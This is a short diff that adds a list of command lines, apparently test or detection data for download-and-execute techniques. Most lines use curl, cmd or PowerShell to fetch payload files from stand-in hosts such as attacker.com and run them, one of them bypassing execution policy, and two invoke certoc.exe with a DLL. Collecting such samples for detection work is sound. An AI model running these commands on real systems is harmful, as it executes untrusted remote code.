@@ -1,0 +1,10 @@
+certoc.exe -GetCACAPS httpayload.dll
+certoc.exe /GetCACAPS httpayload.dll
+cmd.exe /c curl http://example.com/payload.exe --output payload.exe & payload.exe
+cmd.exe /c curl http://example.com/payload.exe > payload.exe & payload.exe
+cmd.exe /c curl.exe http://example.com/payload.exe -o payload.exe & payload.exe
+powershell.exe -c "curl http://example.com/payload.exe -o payload.exe ; .\payload.exe"
+curl --url http://attacker.com/script.bat --out s.bat && s.bat
+curl -s http://attacker.com/payload.ps1 --output p.ps1 ; powershell -ExecutionPolicy Bypass -File p.ps1
+curl -sL http://attacker.com/payload.exe -O && payload.exe
+curl http://attacker.com/payload.exe -o p.exe p.exe
